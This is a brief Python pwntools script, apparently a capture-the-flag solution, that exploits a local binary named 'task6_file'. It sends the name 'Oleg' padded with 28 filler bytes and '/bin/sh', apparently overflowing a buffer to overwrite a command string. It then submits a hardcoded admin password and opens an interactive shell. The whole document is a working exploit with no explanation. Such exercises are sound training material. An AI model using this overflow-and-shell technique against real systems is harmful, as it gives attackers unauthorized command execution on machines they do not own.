from pwn import *

r = process("./task6_file")

r.sendline(b"Oleg" + b"a" * 28 + b"/bin/sh\0")

r.sendline(b"Super_Oleg_admin")

r.interactive()
